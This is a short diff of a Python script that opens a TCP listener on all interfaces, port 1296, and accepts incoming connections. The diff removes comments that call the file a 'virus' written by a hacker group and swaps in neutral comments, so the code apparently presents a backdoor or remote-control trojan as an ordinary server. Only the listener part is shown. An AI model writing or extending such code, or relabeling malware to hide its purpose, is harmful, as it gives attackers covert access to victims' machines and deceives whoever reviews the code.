@@ -4,16 +4,16 @@ import webbrowser
 import ctypes
 
 
-
+# Creating a server
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind(('0.0.0.0', 1296))    
 
-#This virus is written by the hacker group VHS 
-#Your defense is very weak
+#We allow incoming connections
 server.listen()
 
 i = 0
 b = 'cd'
+
 while True:
     user_socket,address=server.accept() 
     while True:
